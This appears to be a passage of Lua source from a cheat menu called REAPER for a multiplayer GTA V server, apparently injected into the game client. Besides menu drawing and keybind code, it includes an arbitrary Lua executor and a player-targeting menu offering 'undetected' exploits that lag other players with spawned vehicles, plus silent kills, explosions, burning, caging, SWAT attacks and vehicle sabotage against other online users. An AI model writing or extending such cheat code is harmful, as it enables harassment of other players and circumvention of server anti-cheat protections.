                        __REAPER1__.N.DrawSprite('timerbar_sr', func2 and 'timer_tick' or 'timer_cross', xpos + 0.1735, __REAPER1__.M.ButtonPosition + 0.0135, 0.01, 0.018, 0.0, func2 and 255 or 230, func2 and 255 or 230, func2 and 255 or 230, func2 and __REAPER1__.M.MenuAlpha - 20 or __REAPER1__.M.MenuAlpha - 40, true)
                    end

                    if __REAPER1__.M.CurrentMenu == 'server:onlineplayers' then
                        if __REAPER1__.T.MugshotTabla[textUp] and __REAPER1__.N.DoesEntityExist(__REAPER1__.T.MugshotTabla[textUp].ped) and __REAPER1__.N.IsPedheadshotReady(__REAPER1__.T.MugshotTabla[textUp].handle) and __REAPER1__.N.IsPedheadshotValid(__REAPER1__.T.MugshotTabla[textUp].handle) then
                            local txd = __REAPER1__.N.GetPedheadshotTxdString(__REAPER1__.T.MugshotTabla[textUp].handle)
                            __REAPER1__.N.DrawSprite(txd, txd, xpos + 0.02, __REAPER1__.M.ButtonPosition + 0.0133, 0.014, 0.025, 0, 255, 255, 255, __REAPER1__.M.MenuAlpha - 45, true)
                        end
                        __REAPER1__.F.DrawText(textUp, xpos + 0.029, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.4)
                    elseif string.find(dkey, "Ma1sj87/%", 1, true) then
                        __REAPER1__.F.DrawText(text, xpos + 0.012, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.4)
                    else
                        __REAPER1__.F.DrawText(textUp, xpos + 0.012, __REAPER1__.M.ButtonPosition, __REAPER1__.A['settings_font'].sindex, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.4)
                    end
                end
            end
    
            __REAPER1__.M.PageOptions = __REAPER1__.M.PageOptions + 1
        end
        
        __REAPER1__.M.Options = __REAPER1__.M.Options + 1
    end

    __REAPER1__.F.CloseMenu = function()
        __REAPER25__(function()
            if __REAPER1__.M.CursorToggle then
                __REAPER1__.T.CursorLastPosMenu = {mx = (__REAPER1__.M.Mousex / __REAPER1__.M.ScreenResox), my = (__REAPER1__.M.Mousey / __REAPER1__.M.ScreenResoy)}
            end
            __REAPER1__.M.MenuAlphaBusy = true
            __REAPER1__.N.PlaySound('def', -1, 'FocusOut', 'HintCamSounds', true)
            if __REAPER1__.A['settings_menufade'].func then
                local fps = __REAPER1__.N.GetFrameTime()
                local add = fps > 0.01 and tonumber(string.sub(fps, 3, 5)) or 5
                while __REAPER1__.M.MenuAlpha > 0 do
                    __REAPER1__.M.MenuAlpha = __REAPER1__.M.MenuAlpha - add > 0 and __REAPER1__.M.MenuAlpha - add or 0
                    __REAPER1__.M.MenuBackgroundAlpha = __REAPER1__.M.MenuBackgroundAlpha - add > 0 and __REAPER1__.M.MenuBackgroundAlpha - add or 0
                    __REAPER26__(0)
                end
            end
            __REAPER1__.M.CurrentMenu = nil
            __REAPER1__.M.MenuAlphaBusy = false
        end)
    end

    __REAPER1__.F.OpenMenu = function()
        __REAPER25__(function()
            if __REAPER1__.M.CursorToggle and __REAPER1__.T.CursorLastPosMenu then
                __REAPER1__.N.SetCursorLocation(__REAPER1__.T.CursorLastPosMenu.mx, __REAPER1__.T.CursorLastPosMenu.my)
            end
            __REAPER1__.M.MenuAlphaBusy = true
            __REAPER1__.N.PlaySound('def', -1, 'Apt_Style_Purchase', 'DLC_APT_Apartment_SoundSet', true)
            if __REAPER1__.A['settings_menufade'].func then
                local fps = __REAPER1__.N.GetFrameTime()
                local add = fps > 0.01 and tonumber(string.sub(fps, 3, 5)) or 5
                while __REAPER1__.M.MenuAlpha ~= 255 do
                    __REAPER1__.M.MenuAlpha = __REAPER1__.M.MenuAlpha + add < 255 and __REAPER1__.M.MenuAlpha + add or 255
                    __REAPER1__.M.MenuBackgroundAlpha = __REAPER1__.M.MenuBackgroundAlpha + add < 163 and __REAPER1__.M.MenuBackgroundAlpha + add or 163
                    __REAPER26__(0)
                end
            end
            __REAPER1__.M.MenuAlphaBusy = false
        end)
    end

    __REAPER1__.F.InfoBox = function(desc, bind, risky, items)
        __REAPER1__.N.DrawSprite('__REAPER16__', '__REAPER17__', 0.5, 0.84, 0.21, 0.07, 0.0, 255, 255, 255, __REAPER1__.M.MenuAlpha- 60)
        __REAPER1__.F.DrawText(desc, 0.4045, 0.814, 0, 255, 255, 255, __REAPER1__.M.MenuAlpha, 0.215)

        if risky and items and type(items) ~= 'boolean' then
            __REAPER1__.F.DrawText('Set bind: ' .. __REAPER1__.A['settings_bind'].func, 0.56, 0.81, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
            __REAPER1__.F.DrawText('Hotkey: ' .. (bind or 'Not set'), 0.56, 0.824, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
            __REAPER1__.F.DrawText('Textbox: ' .. __REAPER1__.A['settings_textbox'].func, 0.56, 0.838, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
            __REAPER1__.F.DrawText('~r~RISKY~s~', 0.5765, 0.852, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2)
        elseif items and type(items) ~= 'boolean' or risky then
            __REAPER1__.F.DrawText('Set bind: ' .. __REAPER1__.A['settings_bind'].func, 0.56, 0.816, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
            __REAPER1__.F.DrawText('Hotkey: ' .. (bind or 'Not set'), 0.56, 0.83, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
            __REAPER1__.F.DrawText(items and 'Textbox: ' .. __REAPER1__.A['settings_textbox'].func or risky and '~r~RISKY~s~', 0.56, 0.844, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
        else
            __REAPER1__.F.DrawText('Set bind: ' .. __REAPER1__.A['settings_bind'].func, 0.56, 0.822, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
            __REAPER1__.F.DrawText('Hotkey: ' .. (bind or 'Not set'), 0.56, 0.836, 0, 220, 220, 220, __REAPER1__.M.MenuAlpha, 0.2, false, false, false, true, 0.15, 0.5955)
        end
    end

    __REAPER1__.F.CheckInputThisFrame = function(v)
        if v.pressed == 1 or v.pressed == 3 then
            if v.state == 1 and Ham.getKeyState(v.keyCheck) == 0 then
                v.pressed = 0
            else
                v.pressed = 3
            end
        end

        v.state = 0
        if Ham.getKeyState(v.keyCheck) ~= 0 then
            v.state = 1

            if v.pressed == 0 then
                v.pressed = 1
            end
        end
    end

    __REAPER1__.F.TextBox = function(str, dkey, tipus, fajta, length, titletext)
        __REAPER1__.M.TextboxWriting = true
        local str, strNum, canend, cancel = tostring(str), nil, false, false
        local isbind = fajta == 'bind' or tipus == 'bind'
    
        for k,v in ipairs(__REAPER1__.T.KeysHam['all']) do
            Ham.getKeyState(v.keyCheck)
            __REAPER1__.F.CheckInputThisFrame(v)
        end
    
        while __REAPER1__.M.TextboxWriting do __REAPER26__(0)
            __REAPER1__.N.DisableAllControlActions(0)
    
            for k,v in ipairs(__REAPER1__.T.KeysHam['all']) do
                if isbind or v.txtbox then
                    if (__REAPER1__.N.IsKeyPressed(k, true) or (__REAPER1__.N.IsKeyHeld(k, true) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.M.TextboxWait or 0))) and string.len(str) < length and (fajta ~= 'szam' or type(tonumber(v.lowerchar)) == 'number') and (type ~= 'betu' or type(v.lowerchar) == 'string') and k ~= 6 and (titletext ~= 'Config name' or k ~= 12 and k ~= 77) then
                        __REAPER1__.M.TextboxWait = __REAPER1__.N.GetGameTimer() + 180
                        str = str .. (__REAPER1__.N.IsKeyHeld(6, true) and v.upperchar and v.upperchar or v.lowerchar)
                        strNum = k
                    end
    
                    __REAPER1__.F.CheckInputThisFrame(v)
                end
            end
    
            __REAPER1__.N.DrawRect(0.5, 0.5, 5.0, 5.0, 0, 0, 0, 50)
            __REAPER1__.N.DrawRect(0.5, 0.796, 0.348, 0.0655, 30, 30, 30, 240)
            __REAPER1__.N.DrawRect(0.5, 0.808, 0.34, 0.025, 50, 50, 50, 240)
            __REAPER1__.N.DrawRect(0.5, 0.79, 0.34, 0.001, 180, 180, 180, 240)
            __REAPER1__.F.DrawText('~c~[~s~REAPER~c~] ' .. titletext .. ' | ' .. #str, 0.33, 0.7665, 4, 255, 255, 255, 240, 0.31)
            __REAPER1__.F.DrawText(str, 0.332, 0.797, 0, 255, 255, 255, 240, 0.25)
    
            if __REAPER1__.N.IsDisabledControlJustPressed(0, 200, true) and __REAPER1__.M.Initialized then
                __REAPER1__.N.PlaySound('def', -1, 'ERROR', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                canend, cancel = true, true
            elseif __REAPER1__.N.IsDisabledControlPressed(0, 194, true) and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.M.ChatDelay or 0) then
                __REAPER1__.M.ChatDelay = __REAPER1__.N.GetGameTimer() + 100
                str = (__REAPER1__.N.IsDisabledControlPressed(0, 21, true) or isbind) and '' or string.sub(str, 1, #str - 1)
            elseif __REAPER1__.N.IsDisabledControlJustPressed(0, 191, true) and string.len(str) > 0 then
                if tipus == 'combo' then
                    local tablem = __REAPER1__.A[dkey]
                    if fajta == 'szam' then
                        str = tonumber(str)
                        local num = str > #tablem.func and #tablem.func or str < tablem.func[1] and tablem.func[1] or 'other'
                        if num ~= 'other' then
                            tablem.cindex = num
                            if tablem.toggle == true then tablem.sindex = num end
                        else
                            for k,v in pairs(tablem.func) do
                                if str == v then
                                    tablem.cindex = k
                                    if tablem.toggle == true then tablem.sindex = k end
                                    break
                                end
                            end
                        end
                    else
                        for k,v in pairs(tablem.func) do
                            if string.lower(str) == string.lower(v) then
                                tablem.cindex = k
                                if tablem.toggle == true then tablem.sindex = k end
                                break
                            end
                        end
                    end
                    canend = true
                elseif tipus == 'buttontextb' then
                    local tablem = __REAPER1__.A[dkey]
                    if fajta == 'szam' then
                        tablem.func = tonumber(str)
                    elseif fajta == 'szin' then
                        local r, g, b, a = __REAPER1__.F.AdvStringSplit(4, str, ' ', true)
                        if r and g and b then
                            tablem.func = str
                            tablem.menuextra = {r = r, g = g, b = b, a = a or 255}
                        end
                    elseif fajta == 'coords' then
                        local x, y, z = __REAPER1__.F.AdvStringSplit(3, str, ' ', true)
                        if x and y and z then
                            tablem.func, tablem.extra = str, vector3(x, y, z)
                        end
                    elseif fajta == 'bind' then
                        local skip = false
                        for k,v in ipairs(__REAPER1__.T.KeysHam['binds']) do
                            for _k,_v in ipairs(v.dkeys) do
                                if tablem.dkey == _v then
                                    if #v.dkeys == 1 then
                                        table.remove(__REAPER1__.T.KeysHam['binds'], k)
                                    else
                                        table.remove(__REAPER1__.T.KeysHam['binds'][k].dkeys, _k)
                                    end
                                    break
                                end
                            end
                        end
    
                        for k,v in ipairs(__REAPER1__.T.KeysHam['binds']) do
                            if v.key == strNum then
                                skip = true
                                table.insert(v.dkeys, tablem.dkey)
                            end
                        end
    
                        if not skip then
                            table.insert(__REAPER1__.T.KeysHam['binds'], {key = strNum, dkeys = {tablem.dkey}})
                        end
    
                        tablem.func, tablem.extra  = str, strNum
                    else
                        tablem.func = str
                    end
                    canend = true
                elseif tipus == 'bind' then
                    local canAdd, change = true, false
                    for k,v in ipairs(__REAPER1__.T.KeysHam['binds']) do
                        for _k,_v in ipairs(v.dkeys) do
                            if _v == dkey then
                                if strNum ~= v.key then
                                    --key v??ltoz??s hang
                                    if #v.dkeys == 1 then
                                        table.remove(__REAPER1__.T.KeysHam['binds'], k)
                                    else
                                        table.remove(__REAPER1__.T.KeysHam['binds'][k].dkeys, _k)
                                    end
                                    __REAPER1__.N.PlaySound('bind', -1, 'DELETE', 'HUD_DEATHMATCH_SOUNDSET', true)
                                    change = true
                                    break
                                else
                                    --kiszed??s hang
                                    if #v.dkeys == 1 then
                                        table.remove(__REAPER1__.T.KeysHam['binds'], k)
                                    else
                                        table.remove(__REAPER1__.T.KeysHam['binds'][k].dkeys, _k)
                                    end
                                    canAdd = false
                                    __REAPER1__.A[dkey].hkey, __REAPER1__.A[dkey].hkeynum = nil
                                    __REAPER1__.N.PlaySound('bind', -1, "5_Second_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS", true)
                                    break
                                end
                            end
                        end
                    end
    
                    if canAdd then
                        local skip = false
                        for k,v in ipairs(__REAPER1__.T.KeysHam['binds']) do
                            if v.key == strNum then
                                skip = true
                                table.insert(v.dkeys, dkey)
                            end
                        end
    
                        if not skip then
                            table.insert(__REAPER1__.T.KeysHam['binds'], {key = strNum, dkeys = {dkey}})
                        end
    
                        if not change then
                            __REAPER1__.N.PlaySound('bind', -1, "5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", true)
                        end
                        __REAPER1__.A[dkey].hkey, __REAPER1__.A[dkey].hkeynum = str, strNum
                    end
                    canend = true
                elseif tipus == 'exec' then
                    __REAPER25__(function()
                        local f, e = load(str)
                        if f then f = f() else
                            __REAPER1__.F.AddNotification('Error. Check the console.', 5000, 255, 0, 0)
                            --[[Ham.printStr]]print("LUA EXECUTOR", '\n^1' .. e)
                        end
                    end)
                    canend = true
                elseif tipus == 'search' then
                    local t, t1 = {}, string.lower(str)
                    __REAPER1__.T.Display['searchopt'], __REAPER1__.A['searchopt'].lasto, __REAPER1__.A['searchopt'].scrollo, __REAPER1__.A['searchopt'].addedo = {}, 1, 0, 0
    
                    for k,v in pairs(__REAPER1__.T.Display) do
                        if k ~= 'zero' then
                            for _k,_v in ipairs(v) do
                                if string.find(string.lower(_v.text), t1, 1, true) then
                                    table.insert(t, _v)
                                elseif _v.desc and string.find(string.lower(_v.desc), t1, 1, true) then
                                    table.insert(t, _v)
                                elseif _v.func then
                                    if type(_v.func) == 'table' then
                                        for x,d in pairs(_v.func) do
                                            if string.find(string.lower(d), t1, 1, true) then
                                                table.insert(t, _v)
                                                break
                                            end
                                        end
                                    elseif type(_v.func) ~= 'boolean' and string.find(string.lower(_v.func), t1, 1, true) then
                                        table.insert(t, _v)
                                    end
                                end
                            end
                        end
                    end
    
                    __REAPER1__.T.Display['searchopt'] = t
                    __REAPER1__.F.SetMenu(__REAPER1__.M.Submenu[1], __REAPER1__.M.Submenu[2])
                    canend = true
                else
                    canend = true
                end
            end
    
            if canend then
                if tipus ~= 'bind' and not cancel then __REAPER1__.N.PlaySound('def', -1, "NAV", "HUD_AMMO_SHOP_SOUNDSET", true) end
                __REAPER26__(150)
                __REAPER1__.M.TextboxWriting = false
    
                if tipus == 'altalanos' then
                    return not cancel and str or false
                end
            end
        end
    end
    
    __REAPER1__.F.AddNotification = function(text, duration, r, g, b)
        if __REAPER1__.A['settings_notifications'].func then
            if __REAPER1__.T.Notifications[1] then
                for k,v in ipairs(__REAPER1__.T.Notifications) do
                    if text == v.notify then
                        return
                    end
                end
            elseif __REAPER1__.M.NotificationAlpha ~= 0 then
                __REAPER1__.M.NotificationAlpha = 0
            end

            table.insert(__REAPER1__.T.Notifications, {notify = text, number = __REAPER1__.T.Notifications[1] and __REAPER1__.T.Notifications[#__REAPER1__.T.Notifications].number + 1 or 1, dur = duration, colorR = r, colorG = g, colorB = b, time = __REAPER1__.N.GetGameTimer()})
        end
    end

    __REAPER1__.F.ApplyOMenu = function(dkey)
        local id = tonumber(__REAPER1__.F.StringSplit(dkey, ':')[1])
        __REAPER1__.T.Display[dkey] = {
            {text = 'Exploits (undetected)', dkey = dkey .. ':exploit', desc = 'Exploits menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':exploit'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'Vehicle', dkey = dkey .. ':vehicle', desc = 'Vehicle menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':vehicle'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'Weapon', dkey = dkey .. ':weapon', desc = 'Weapon menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':weapon'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'Sound', dkey = dkey .. ':sound', desc = 'Sound menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':sound'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'Explode', dkey = dkey .. ':explosion', desc = 'Explode menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':explosion'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'Trigger', dkey = dkey .. ':trigger', desc = 'Trigger menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':trigger'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'Particle', dkey = dkey .. ':particle', desc = 'Particle menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':particle'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'Attach', dkey = dkey .. ':attach', desc = 'Attach menu.', option = __REAPER1__.M.Menu_Button, func = {dkey, dkey .. ':attach'}, lasto = 1, scrollo = 0, addedo = 0, extra = id},
            {text = 'General', option = __REAPER1__.M.Separator},
            {text = 'Target', dkey = dkey .. '_target', desc = 'Add or remove the player from\nthe targeting list.', afu = __REAPER1__.M.oplayers.target, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Spectate', dkey = dkey .. '_spectate', desc = 'Spectate the player.', afu = __REAPER1__.M.oplayers.spectate, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Kill', dkey = dkey .. '_kill', desc = 'Kill the player silently or under your\nname.', afu = __REAPER1__.M.oplayers.kill, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Kill type', length = 10, tipus = 'betu', func = {'Normal', 'Silent'}, extra = id},
            {text = 'Taze', dkey = dkey .. '_taze', desc = 'Taze the player.', afu = __REAPER1__.M.oplayers.taze, option = __REAPER1__.M.Button, extra = id},
            {text = 'Blame drag', dkey = dkey .. '_blamedrag', desc = 'When enabled you\'ll be grabbed like\nin the police script by the player.', afu = __REAPER1__.M.oplayers.blamedrag, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Burn', dkey = dkey .. '_burn', desc = 'Burn the player.', afu = __REAPER1__.M.oplayers.burn, option = __REAPER1__.M.Button, extra = id},
            {text = 'Launch', dkey = dkey .. '_launch', desc = 'Launch the player in the sky.', afu = __REAPER1__.M.oplayers.launch, option = __REAPER1__.M.Button, extra = id},
            {text = 'Cage', dkey = dkey .. '_cage', desc = 'Toggle the cage on the player.', afu = __REAPER1__.M.oplayers.cage, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Demi god', dkey = dkey .. '_demigod', desc = 'Toggle the demi god mode on the\nplayer.', afu = __REAPER1__.M.oplayers.demigod, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Alpha', dkey = dkey .. '_alpha', desc = 'Set the player\'s alpha.', afu = __REAPER1__.M.oplayers.alpha, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Alpha number', length = 3, tipus = 'szam', func = __REAPER1__.T.AlphaValues, extra = id},
            {text = 'Copy outfit', dkey = dkey .. '_copyoutfit', desc = 'Copy the player\'s outfit.', afu = __REAPER1__.M.oplayers.coutfit, option = __REAPER1__.M.Button, extra = id},
            {text = 'Copy outfit & ped', dkey = dkey .. '_copyoutfitped', desc = 'Copy the player\'s outfit and the look\nof his ped.', afu = __REAPER1__.M.oplayers.coutfitped, option = __REAPER1__.M.Button, extra = id},
            {text = 'Teleport', option = __REAPER1__.M.Separator},
            {text = 'To player', dkey = dkey .. '_toplayer', desc = 'Teleport to the player.', afu = __REAPER1__.M.oplayers.toply, option = __REAPER1__.M.Button, extra = id},
            {text = 'Around', dkey = dkey .. '_around', desc = 'Teleport around the player.', afu = __REAPER1__.M.oplayers.around, option = __REAPER1__.M.Button, extra = id},
            {text = 'In vehicle', dkey = dkey .. '_invehicle', desc = 'Teleport in the player\'s vehicle.', afu = __REAPER1__.M.oplayers.inveh, option = __REAPER1__.M.Button, extra = id},
            {text = 'Vehicle to me', dkey = dkey .. '_vehtome', desc = 'Teleport the player\'s vehicle to me.', afu = __REAPER1__.M.oplayers.vehtome, option = __REAPER1__.M.Button, extra = id},
            {text = 'Peds', option = __REAPER1__.M.Separator},
            {text = 'Clone', dkey = dkey .. '_clone', desc = 'Clone the player.', afu = __REAPER1__.M.oplayers.clone, option = __REAPER1__.M.Button, extra = id},
            {text = 'Hostile (ped)', dkey = dkey .. '_hostileped', desc = 'Make the player pedestrian hostile.', afu = __REAPER1__.M.oplayers.hostileped, option = __REAPER1__.M.Button, extra = id},
            {text = 'Hostile (traffic)', dkey = dkey .. '_hostiletraffic', desc = 'Make the player traffic hostile.', afu = __REAPER1__.M.oplayers.hostileveh, option = __REAPER1__.M.Button, extra = id},
            {text = 'Attack by clones', dkey = dkey .. '_attackbyclones', desc = 'Attack the player by their clones.', afu = __REAPER1__.M.oplayers.attackc, option = __REAPER1__.M.Button, extra = id},
            {text = 'Attack by SWAT', dkey = dkey .. '_attackbyswat', desc = 'Attack the player by a SWAT team.', afu = __REAPER1__.M.oplayers.attacks, option = __REAPER1__.M.Button, extra = id},
            {text = 'Spawn bodyguards', dkey = dkey .. '_spawnbodyguard', desc = 'Spawn bodyguards for the player.', afu = __REAPER1__.M.oplayers.bodyg, option = __REAPER1__.M.Button, extra = id},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey]) do
            if v.dkey then
                __REAPER1__.A[v.dkey] = v
            end
        end
        __REAPER1__.T.Display[dkey .. ':exploit'] = {
            {text = 'Bug vehicle', dkey = dkey .. 'i_bugvehicle', desc = 'Bug the player\'s vehicle.', afu = __REAPER1__.M.oplayers.exploits.bugveh, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Lagging', option = __REAPER1__.M.Separator},
            {text = 'Lag amount', dkey = dkey .. 'i_lagamount', desc = 'Set the amount of lagging vehicles.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Lag amount number', length = 2, tipus = 'szam', func = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}, extra = id},
            {text = 'Clean up', dkey = dkey .. 'i_cleanup', desc = 'Clean up the spawned vehicles.', afu = __REAPER1__.M.oplayers.exploits.cleanup, option = __REAPER1__.M.Button, extra = id},
            {text = 'Plane', dkey = dkey .. 'i_planes', desc = 'Lag the player with planes.', afu = __REAPER1__.M.oplayers.exploits.lag, option = __REAPER1__.M.Button, extra = id, extra2 = `cargoplane`},
            {text = 'Plane 2', dkey = dkey .. 'i_planes2', desc = 'Lag the player with planes.', afu = __REAPER1__.M.oplayers.exploits.lag, option = __REAPER1__.M.Button, extra = id, extra2 = `jet`},
            {text = 'Blimp', dkey = dkey .. 'i_blimp', desc = 'Lag the player with blimps.', afu = __REAPER1__.M.oplayers.exploits.lag, option = __REAPER1__.M.Button, extra = id, extra2 = `blimp`},
            {text = 'Tank', dkey = dkey .. 'i_tank', desc = 'Lag the player with tanks.', afu = __REAPER1__.M.oplayers.exploits.lag, option = __REAPER1__.M.Button, extra = id, extra2 = `rhino`},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':exploit']) do
            if v.dkey then
                __REAPER1__.A[v.dkey] = v
            end
        end
        __REAPER1__.T.Display[dkey .. ':explosion'] = {
            {text = 'Explode', dkey = dkey .. 'e_explode', desc = 'Explode the player.', afu = __REAPER1__.M.oplayers.explosion.explode, option = __REAPER1__.M.Button, extra = id},
            {text = 'Loop explode', dkey = dkey .. 'e_loopexplode', desc = 'Loop exploding the player.', afu = __REAPER1__.M.oplayers.explosion.lexplode, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Type', dkey = dkey .. 'e_type', desc = 'Select the type of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion type', length = 10, tipus = 'betu', func = __REAPER1__.T.Explosions, extra = id},
            {text = 'Damage', dkey = dkey .. 'e_damage', desc = 'The damage of the explosion.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Explosion damage number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval, extra = id},
            {text = 'Invisible', dkey = dkey .. 'e_invisible', desc = 'Make the explosion invisible.', option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Audible', dkey = dkey .. 'e_audible', desc = 'Make the explosion audible.', option = __REAPER1__.M.Checkbox, func = false, extra = id},
        }
        for k,v in pairs(__REAPER1__.T.Display[dkey .. ':explosion']) do
            __REAPER1__.A[v.dkey] = v
        end
        __REAPER1__.T.Display[dkey .. ':vehicle'] = {
            {text = 'Delete', dkey = dkey .. 'v_deletevehicle', desc = 'Delete the vehicle the player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.deletevehicle, option = __REAPER1__.M.Button, extra = id},
            {text = 'Delete in range', dkey = dkey .. 'v_deleteinrange', desc = 'Delete the vehicles around the player\nin a specified range.', afu = __REAPER1__.M.oplayers.vehicle.deleteinrange, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Delete range', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas, extra = id},
            {text = 'Launch', dkey = dkey .. 'v_launchvehicle', desc = 'Launch the player\'s vehicle in the sky.', afu = __REAPER1__.M.oplayers.vehicle.launchveh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Launch power number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres, extra = id},
            {text = 'Remove wheels', dkey = dkey .. 'v_removewheels', desc = 'Remove the wheels of the vehicle\nthe player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.removewheels, option = __REAPER1__.M.Button, extra = id},
            {text = 'Set speed (kmh)', dkey = dkey .. 'v_setspeed', desc = 'Set the speed of the vehicle the\nplayer is\nsitting in.', afu = __REAPER1__.M.oplayers.vehicle.setspeed, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Speed number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval, extra = id},
            {text = 'Clone', dkey = dkey .. 'v_clonevehicle', desc = 'Clone the vehicle the player is\nsitting in.', afu = __REAPER1__.M.oplayers.vehicle.cloneveh, option = __REAPER1__.M.Button, extra = id},
            {text = 'Freeze', dkey = dkey .. 'v_freeze', desc = 'Freeze the vehicle the player is\nsitting in.', afu = __REAPER1__.M.oplayers.vehicle.freeze, option = __REAPER1__.M.Checkbox, func = false, extra = id},
            {text = 'Customs', option = __REAPER1__.M.Separator},
            {text = 'Fuck up', dkey = dkey .. 'v_fuckup', desc = 'Fuck up the vehicle the player is\nsitting in.', afu = __REAPER1__.M.oplayers.vehicle.fuckup, option = __REAPER1__.M.Button, extra = id},
            {text = 'Tune', dkey = dkey .. 'v_tune', desc = 'Tune the vehicle the player is\nsitting in.', afu = __REAPER1__.M.oplayers.vehicle.tune, option = __REAPER1__.M.Button, extra = id},
            {text = 'Downgrade', dkey = dkey .. 'v_downgrade', desc = 'Downgrade the vehicle the player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.downgrade, option = __REAPER1__.M.Button, extra = id},
            {text = 'Fix', dkey = dkey .. 'v_fix', desc = 'Fix the vehicle the player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.fix, option = __REAPER1__.M.Button, extra = id},
            {text = 'Randomize', dkey = dkey .. 'v_randomize', desc = 'Randomize the vehicle the player\nis sitting in.', afu = __REAPER1__.M.oplayers.vehicle.randomize, option = __REAPER1__.M.Button, extra = id},
            {text = 'Misc', option = __REAPER1__.M.Separator},
            {text = 'Fuel', dkey = dkey .. 'v_fuel', desc = 'Set fuel in the vehicle the player\nis sitting in.', afu = __REAPER1__.M.oplayers.vehicle.fuel, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Fuel amount number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval, extra = id},
            {text = 'Door lock', dkey = dkey .. 'v_doorlock', desc = 'Toggle the door lock for the vehicle\nthe player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.lock, option = __REAPER1__.M.Button, extra = id},
            {text = 'Open door', dkey = dkey .. 'v_opendoor', desc = 'Open a specified door in the vehicle\nthe player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.open, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors, extra = id},
            {text = 'Close door', dkey = dkey .. 'v_closedoor', desc = 'Close a specified door in the vehicle\nthe player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.close, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors, extra = id},
            {text = 'Delete door', dkey = dkey .. 'v_deletedoor', desc = 'Delete a specified door in the vehicle\nthe player is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.delete, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Door name', length = 10, tipus = 'betu', func = __REAPER1__.T.VehicleDoors, extra = id},
            {text = 'Flip', dkey = dkey .. 'v_flip', desc = 'Flip upside down the vehicle the\nplayer is sitting in.', afu = __REAPER1__.M.oplayers.vehicle.flip, option = __REAPER1__.M.Button, extra = id},
        }
